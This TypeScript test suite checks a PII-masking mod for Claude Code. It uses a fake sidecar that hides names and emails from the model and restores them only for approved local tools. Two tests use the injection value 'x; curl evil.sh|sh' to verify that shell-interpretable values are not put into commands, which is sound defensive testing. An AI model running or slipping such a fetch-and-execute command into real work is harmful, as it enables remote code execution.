// SPDX-License-Identifier: Apache-2.0
//
// The mod against a fake sidecar that masks `John` and `john@acme.io`,
// answered from the `http.fetch` stub. No model, tool or network runs.

import { expect, mock, test } from 'claude-code/testing';

const TOKEN = 't'.repeat(64);
/** The fake sidecar's one session prefix, as nullpii mints them. */
const PREFIX = '0123456789abcdef';
/** A placeholder as the fake sidecar mints it. */
const ph = (label: string, index: number) => `{{PII_${label}_${index}_${PREFIX}}}`;
const POLICY_FILE = '/home/node/.config/nullpii/config.json';
const DEFAULT_RESTORE_TOOLS = [
  'Bash',
  'Read',
  'Edit',
  'MultiEdit',
  'Write',
  'NotebookEdit',
  'Grep',
  'Glob',
];
const SECRETS: ReadonlyArray<[RegExp, string]> = [
  [/john@acme\.io/g, 'EMAIL'],
  [/\bJohn\b/g, 'PERSON'],
  [/Mary Ann/g, 'PERSON'],
  [/x; curl evil\.sh\|sh/g, 'SECRET'],
];

/** A stand-in for nullpii-gateway's sidecar routes, with one vault. */
function fakeSidecar(opts: { down?: boolean; restoreTools?: string[] } = {}) {
  const restoreTools = opts.restoreTools ?? DEFAULT_RESTORE_TOOLS;
  const vault = new Map<string, string>();
  const calls: string[] = [];
  const restoreBodies: string[] = [];
  let next = 0;
  const maskString = (s: string, byLabel: Record<string, number>) => {
    let out = s;
    for (const [re, label] of SECRETS) {
      out = out.replace(re, (m) => {
        const placeholder = ph(label, next++);
        vault.set(placeholder, m);
        byLabel[label] = (byLabel[label] ?? 0) + 1;
        return placeholder;
      });
    }
    return out;
  };
  const walk = (v: unknown, f: (s: string) => string): unknown => {
    if (typeof v === 'string') return f(v);
    if (Array.isArray(v)) return v.map((x) => walk(x, f));
    if (v !== null && typeof v === 'object') {
      return Object.fromEntries(Object.entries(v).map(([k, x]) => [k, walk(x, f)]));
    }
    return v;
  };
  const respond = (status: number, body: unknown) => ({
    value: {
      status,
      ok: status < 300,
      headers: {},
      text: body === undefined ? '' : JSON.stringify(body),
    },
  });
  const handler = (
    $: unknown,
    e: { url: string; init?: { method?: string; body?: string; headers?: Record<string, string> } },
  ) => {
    const method = e.init?.method ?? 'GET';
    const path = new URL(e.url).pathname;
    calls.push(`${method} ${path}`);
    if (opts.down) return { deny: 'connect ECONNREFUSED 127.0.0.1:8787' };
    if (e.init?.headers?.authorization !== `Bearer ${TOKEN}`)
      return respond(401, { error: 'unauthorized' });
    // Fastify refuses a JSON content type with an empty body.
    if (e.init?.headers?.['content-type'] === 'application/json' && !e.init.body)
      return respond(400, { error: 'empty_json_body' });
    if (method === 'PUT' || method === 'DELETE')
      return respond(method === 'PUT' ? 201 : 204, undefined);
    if (path === '/v1/sidecar/status') {
      return respond(200, {
        status: 'ok',
        sessions: 1,
        policy: { file: POLICY_FILE, loaded: true, config: {}, restoreTools },
      });
    }
    const body = JSON.parse(e.init?.body ?? '{}') as { value: unknown; tool?: string };
    if (path.endsWith('/restore')) restoreBodies.push(e.init?.body ?? '');
    if (path.endsWith('/sanitize')) {
      const byLabel: Record<string, number> = {};
      const value = walk(body.value, (s) => maskString(s, byLabel));
      const captured = Object.values(byLabel).reduce((a, b) => a + b, 0);
      return respond(200, { value, captured, capturedByLabel: byLabel });
    }
    const counts = {
      replacementsByLabel: {},
      unknownPlaceholders: 0,
      foreignPlaceholders: 0,
    };
    if (body.tool !== undefined && !restoreTools.includes(body.tool)) {
      const held = JSON.stringify(body.value).match(/\{\{PII_[A-Z]+_\d+_[0-9a-f]{16}\}\}/g);
      return respond(200, {
        value: body.value,
        replacements: 0,
        ...counts,
        heldForTool: held?.length ?? 0,
      });
    }
    let replacements = 0;
    // Stand-in for the gateway's shell rule on a shell tool (tested there):
    // in `command`, a value is restored only if it is a plain word or sits
    // inside single quotes and has none.
    const kept: string[] = [];
    const restoreIn = (text: string, shellRule: boolean) =>
      text.replace(/\{\{PII_[A-Z]+_\d+_[0-9a-f]{16}\}\}/g, (placeholder, at: number) => {
        const real = vault.get(placeholder);
        if (real === undefined) return placeholder;
        const end = at + placeholder.length;
        const quoted = text[at - 1] === "'" && text[end] === "'" && !real.includes("'");
        if (shellRule && !/^[A-Za-z0-9@%+=:,./_-]+$/.test(real) && !quoted) {
          if (!kept.includes(placeholder)) kept.push(placeholder);
          return placeholder;
        }
        replacements += 1;
        return real;
      });
    const shellBody = body.tool === 'Bash';
    const input = body.value as Record<string, unknown>;
    const value = shellBody
      ? Object.fromEntries(
          Object.entries(input).map(([k, v]) => [
            k,
            typeof v === 'string' ? restoreIn(v, k === 'command') : v,
          ]),
        )
      : walk(body.value, (s) => restoreIn(s, false));
    return respond(200, {
      value,
      replacements,
      ...counts,
      ...(shellBody && { shellKeptMasked: kept }),
    });
  };
  return { handler, calls, restoreBodies };
}

function stubSession(
  on,
  sidecar: ReturnType<typeof fakeSidecar>,
  env: Record<string, string> = { NULLPII_SIDECAR_TOKEN: TOKEN },
) {
  mock.env(on, env);
  on('session.start', () => ({ cwd: '/work' }));
  on('command.register', () => ({ value: undefined }));
  on('session.id', () => ({ value: 'session-1' }));
  on('ui.toast', () => ({ value: undefined }));
  on('ui.log', () => ({ value: undefined }));
  on('http.fetch', sidecar.handler);
}

async function start($) {
  await $.session.start({ surface: 'terminal', isInteractive: true, cwd: '/work' });
}

const COMPOSER = { kind: 'composer' } as const;

test('a prompt reaches Claude with placeholders, and the sidecar session is opened', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  const seen: string[] = [];
  on('prompt.submit', ($, e) => {
    seen.push(e.text);
    return { text: e.text };
  });
  await start($);
  await $.prompt.submit({ text: 'Mail John at john@acme.io', wait: false, origin: COMPOSER });
  expect(seen.length).toBe(1);
  expect(seen[0]).not.toContain('John');
  expect(seen[0]).not.toContain('john@acme.io');
  expect(sidecar.calls[0]).toBe('PUT /v1/sidecar/sessions/session-1');
  const status = await $.command.run({ command: 'pii', args: '' });
  expect(status.text).toContain('Status: on');
});

test('a tool result is masked and returned as a fresh result, without core ref', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('tool.call', () => ({
    result: { stdout: 'owner: John', stderr: '' },
    ref: 7,
    text: 'owner: John',
  }));
  await start($);
  const out = await $.tool.call({ tool: 'Bash', command: 'cat owners.txt' });
  expect(JSON.stringify(out)).not.toContain('John');
  expect(out.ref).toBeUndefined();
  expect(out.text).toBeUndefined();
});

test('placeholders in a local tool call get their real values back before it runs', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  const commands: string[] = [];
  on('prompt.submit', ($, e) => ({ text: e.text }));
  on('tool.call', ($, e) => {
    commands.push(e.command);
    return { result: { stdout: 'found john@acme.io', stderr: '' } };
  });
  await start($);
  await $.prompt.submit({ text: 'grep for john@acme.io', wait: false, origin: COMPOSER });
  const placeholder = ph('EMAIL', 0);
  const out = await $.tool.call({ tool: 'Bash', command: `grep -r ${placeholder} .` });
  expect(commands).toEqual(['grep -r john@acme.io .']);
  expect(JSON.stringify(out)).not.toContain('john@acme.io');
});

test('a call with nothing to restore is passed on as Claude wrote it', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  const received: unknown[] = [];
  on('tool.call', ($, e) => {
    received.push(e);
    return { result: { stdout: '', stderr: '' } };
  });
  await start($);
  await $.tool.call({ tool: 'Bash', command: 'ls' });
  expect(received.length).toBe(1);
  expect((received[0] as { command: string }).command).toBe('ls');
});

test('a tool that sends data elsewhere keeps the placeholders', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  const urls: string[] = [];
  on('prompt.submit', ($, e) => ({ text: e.text }));
  on('tool.call', ($, e) => {
    urls.push(e.url);
    return { result: 'ok' };
  });
  await start($);
  await $.prompt.submit({ text: 'look up john@acme.io', wait: false, origin: COMPOSER });
  await $.tool.call({
    tool: 'WebFetch',
    url: `https://example.com/?q=${ph('EMAIL', 0)}`,
    prompt: 'x',
  });
  expect(urls).toEqual([`https://example.com/?q=${ph('EMAIL', 0)}`]);
  const report = await $.command.run({ command: 'pii', args: '' });
  expect(report.text).toContain('Placeholders kept in calls to other tools: 1');
});

test('an errored tool result reaches Claude masked, as a refusal', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('tool.call', () => ({ isError: true, result: 'boom', text: 'no such user John' }));
  await start($);
  const out = await $.tool.call({ tool: 'Bash', command: 'id' });
  expect(typeof out.deny).toBe('string');
  expect(out.deny).not.toContain('John');
});

test('with the sidecar down, a prompt is handed back and a tool call is refused', async ($, on) => {
  const sidecar = fakeSidecar({ down: true });
  stubSession(on, sidecar);
  const ran: string[] = [];
  on('prompt.submit', ($, e) => ({ text: e.text }));
  on('tool.call', ($, e) => {
    ran.push(e.tool);
    return { result: 'ok' };
  });
  await start($);
  const prompt = await $.prompt.submit({ text: 'Mail John', wait: false, origin: COMPOSER });
  expect(prompt.drop).toMatch(/nullpii could not mask this prompt/);
  const call = await $.tool.call({ tool: 'Bash', command: 'ls' });
  expect(call.deny).toMatch(/nullpii could not reach its sidecar/);
  expect(ran).toEqual([]);
});

test('without a token, the mod blocks instead of sending data unmasked', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar, {});
  on('prompt.submit', ($, e) => ({ text: e.text }));
  await start($);
  const prompt = await $.prompt.submit({ text: 'hello', wait: false, origin: COMPOSER });
  expect(prompt.drop).toMatch(/NULLPII_SIDECAR_TOKEN is not set/);
});

const BAND = {
  plugin: 'nullpii',
  component: 'AbovePrompt',
  requestId: 'above-prompt',
  surface: 'terminal',
  viewport: { columns: 100, rows: 30 },
  props: {
    hasSurvey: false,
    isWorking: false,
    maxRows: 4,
    bodyColumns: 100,
    scroll: { offset: 0, bodyRows: 4 },
    view: {},
  },
} as const;

test('the band above the prompt shows what was masked, by type', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('prompt.submit', ($, e) => ({ text: e.text }));
  on('ui.render', () => ({ type: 'Text', props: {}, children: ['drawn by another mod'] }));
  await start($);
  await $.prompt.submit({ text: 'John, john@acme.io', wait: false, origin: COMPOSER });
  const ui = await $.ui.mount(BAND);
  expect(
    await ui.find({ type: 'Text', text: /^nullpii · 2 masked \(EMAIL 1 · PERSON 1\)/ }),
  ).toBeDefined();
  expect(await ui.find({ type: 'Text', text: 'drawn by another mod' })).toBeDefined();
  await ui.unmount();
});

test('the band turns into a warning when the mod is blocking', async ($, on) => {
  const sidecar = fakeSidecar({ down: true });
  stubSession(on, sidecar);
  on('ui.render', () => ({ type: 'Text', props: {}, children: [''] }));
  await start($);
  const ui = await $.ui.mount(BAND);
  const line = await ui.find({ type: 'Text', text: /^nullpii · blocking:/ });
  expect(line).toBeDefined();
  expect(line?.props.color).toBe('red');
  await ui.unmount();
});

function messageSite(text: string) {
  return {
    plugin: 'nullpii',
    component: 'AssistantMessage',
    requestId: 'msg-1',
    surface: 'terminal',
    viewport: { columns: 100, rows: 30 },
    props: { text, isFirstOfReply: true },
  } as const;
}

test("Claude's reply is drawn with real values, while Claude keeps the placeholders", async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('prompt.submit', ($, e) => ({ text: e.text }));
  on('ui.render', ($, e) => ({ type: 'Text', props: {}, children: [e.props.text] }));
  await start($);
  await $.prompt.submit({ text: 'write to john@acme.io', wait: false, origin: COMPOSER });
  const ui = await $.ui.mount(messageSite(`Sent the draft to ${ph('EMAIL', 0)}.`));
  expect(await ui.find({ type: 'Text', text: 'Sent the draft to john@acme.io.' })).toBeDefined();
  await ui.unmount();
});

test('a reply without placeholders is drawn without asking the sidecar', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('ui.render', ($, e) => ({ type: 'Text', props: {}, children: [e.props.text] }));
  await start($);
  const before = sidecar.calls.length;
  const ui = await $.ui.mount(messageSite('All tests pass.'));
  expect(await ui.find({ type: 'Text', text: 'All tests pass.' })).toBeDefined();
  expect(sidecar.calls.length).toBe(before);
  await ui.unmount();
});

test('an @-mentioned file reaches Claude masked', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('prompt.attachment', ($, e) => ({ text: e.text }));
  await start($);
  const out = await $.prompt.attachment({
    type: 'file',
    text: 'owners: John <john@acme.io>',
    origin: { kind: 'engine' },
  });
  expect(out.text).not.toContain('John');
  expect(out.text).not.toContain('john@acme.io');
});

test("the first message's context reaches Claude masked", async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('prompt.context', ($, e) => ({ blocks: e.blocks }));
  await start($);
  const out = await $.prompt.context({
    blocks: [
      { name: 'userEmail', text: 'john@acme.io' },
      { name: 'currentDate', text: '2026-10-17' },
    ],
    instructionFiles: [],
  });
  expect(JSON.stringify(out.blocks)).not.toContain('john@acme.io');
  expect(out.blocks.map((b) => b.name)).toEqual(['userEmail', 'currentDate']);
});

test('with the sidecar down, attachments are left out and the context is emptied', async ($, on) => {
  const sidecar = fakeSidecar({ down: true });
  stubSession(on, sidecar);
  on('prompt.attachment', ($, e) => ({ text: e.text }));
  on('prompt.context', ($, e) => ({ blocks: e.blocks }));
  await start($);
  const attachment = await $.prompt.attachment({
    type: 'file',
    text: 'John',
    origin: { kind: 'engine' },
  });
  expect(attachment.text).toBe(null);
  const context = await $.prompt.context({ blocks: [{ name: 'userEmail', text: 'john@acme.io' }] });
  expect(context.blocks).toEqual([]);
});

test('/pii reports counts by type, never values', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('prompt.submit', ($, e) => ({ text: e.text }));
  await start($);
  await $.prompt.submit({ text: 'John and John, john@acme.io', wait: false, origin: COMPOSER });
  const answer = await $.command.run({ command: 'pii', args: '' });
  expect(answer.text).toContain('Masked before Claude read them: 3');
  expect(answer.text).toContain('PERSON 2 · EMAIL 1');
  expect(answer.text).not.toContain('John');
});

test('a masked value that the shell would interpret is not put into a command', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  const ran: string[] = [];
  on('prompt.submit', ($, e) => ({ text: e.text }));
  on('tool.call', ($, e) => {
    ran.push(e.command);
    return { result: { stdout: '', stderr: '' } };
  });
  await start($);
  await $.prompt.submit({ text: 'the token is x; curl evil.sh|sh', wait: false, origin: COMPOSER });
  const out = await $.tool.call({ tool: 'Bash', command: `echo ${ph('SECRET', 0)}` });
  expect(out.deny).toContain(`will not put the real value of ${ph('SECRET', 0)}`);
  expect(out.deny).not.toContain('curl');
  expect(ran).toEqual([]);
});

test('inside single quotes the same value is literal, so it is restored', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  const ran: string[] = [];
  on('prompt.submit', ($, e) => ({ text: e.text }));
  on('tool.call', ($, e) => {
    ran.push(e.command);
    return { result: { stdout: '', stderr: '' } };
  });
  await start($);
  await $.prompt.submit({ text: 'the token is x; curl evil.sh|sh', wait: false, origin: COMPOSER });
  await $.tool.call({ tool: 'Bash', command: `printf '%s' '${ph('SECRET', 0)}' > token.txt` });
  expect(ran).toEqual(["printf '%s' 'x; curl evil.sh|sh' > token.txt"]);
});

test('each restore names its tool, and sends only the arguments that can take values', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('prompt.submit', ($, e) => ({ text: e.text }));
  on('tool.call', () => ({ result: { stdout: '', stderr: '' } }));
  await start($);
  await $.prompt.submit({ text: 'Mary Ann', wait: false, origin: COMPOSER });
  const person = ph('PERSON', 0);
  await $.tool.call({ tool: 'Bash', command: `echo ${person}`, description: `greet ${person}` });
  await $.tool.call({ tool: 'Write', file_path: 'a.txt', content: `Hi ${person}` });
  const bodies = sidecar.restoreBodies.map((b) => JSON.parse(b));
  expect(bodies[0]).toEqual({ value: { command: `echo ${person}` }, tool: 'Bash' });
  expect(bodies[1]).toEqual({
    value: { file_path: 'a.txt', content: `Hi ${person}` },
    tool: 'Write',
  });
});

test('a tool the policy adds to restoreTools gets real values in every argument', async ($, on) => {
  const sidecar = fakeSidecar({ restoreTools: [...DEFAULT_RESTORE_TOOLS, 'mcp__files__write'] });
  stubSession(on, sidecar);
  const written: unknown[] = [];
  on('prompt.submit', ($, e) => ({ text: e.text }));
  on('tool.call', ($, e) => {
    written.push({ path: e.path, text: e.text });
    return { result: 'ok' };
  });
  await start($);
  await $.prompt.submit({ text: 'note for John', wait: false, origin: COMPOSER });
  await $.tool.call({ tool: 'mcp__files__write', path: 'n.txt', text: `for ${ph('PERSON', 0)}` });
  expect(written).toEqual([{ path: 'n.txt', text: 'for John' }]);
});

test('a policy that drops a local tool keeps its placeholders', async ($, on) => {
  const sidecar = fakeSidecar({ restoreTools: ['Read'] });
  stubSession(on, sidecar);
  const commands: string[] = [];
  on('prompt.submit', ($, e) => ({ text: e.text }));
  on('tool.call', ($, e) => {
    commands.push(e.command);
    return { result: { stdout: '', stderr: '' } };
  });
  await start($);
  await $.prompt.submit({ text: 'grep for john@acme.io', wait: false, origin: COMPOSER });
  await $.tool.call({ tool: 'Bash', command: `grep -r ${ph('EMAIL', 0)} .` });
  expect(commands).toEqual([`grep -r ${ph('EMAIL', 0)} .`]);
});

test('a call without placeholders does not ask the sidecar to restore', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('tool.call', () => ({ result: { stdout: '', stderr: '' } }));
  await start($);
  await $.tool.call({ tool: 'Bash', command: 'ls' });
  await $.tool.call({ tool: 'WebFetch', url: 'https://example.com', prompt: 'x' });
  expect(sidecar.restoreBodies).toEqual([]);
});

test('/pii shows the policy the sidecar runs with', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  await start($);
  const answer = await $.command.run({ command: 'pii', args: '' });
  expect(answer.text).toContain(`Policy file: ${POLICY_FILE} (loaded)`);
  expect(answer.text).toContain('Tools that get real values back: Bash, Read');
  expect(answer.text).toContain('apply when nullpii-gateway restarts');
});

test('a call that may change the policy file is put to the user', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('tool.check', () => ({ decision: 'allow' }));
  await start($);
  const asks = [
    { tool: 'Write', input: { file_path: POLICY_FILE, content: '{}' } },
    { tool: 'Edit', input: { file_path: '/srv/alt/.config/nullpii/config.json' } },
    { tool: 'Bash', input: { command: 'echo {} > ~/.config/nullpii/config.json' } },
    { tool: 'Bash', input: { command: 'export NULLPII_CONFIG=/tmp/loose.json' } },
  ];
  for (const call of asks) {
    expect((await $.tool.check(call)).decision).toBe('ask');
  }
  const allows = [
    { tool: 'Write', input: { file_path: '/work/config.json', content: '{}' } },
    { tool: 'Read', input: { file_path: POLICY_FILE } },
    { tool: 'Bash', input: { command: 'ls' } },
  ];
  for (const call of allows) {
    expect((await $.tool.check(call)).decision).toBe('allow');
  }
});

test('a refusal stays a refusal on the policy file', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('tool.check', () => ({ decision: 'deny', reason: 'rule' }));
  await start($);
  const out = await $.tool.check({ tool: 'Write', input: { file_path: POLICY_FILE } });
  expect(out).toEqual({ decision: 'deny', reason: 'rule' });
});
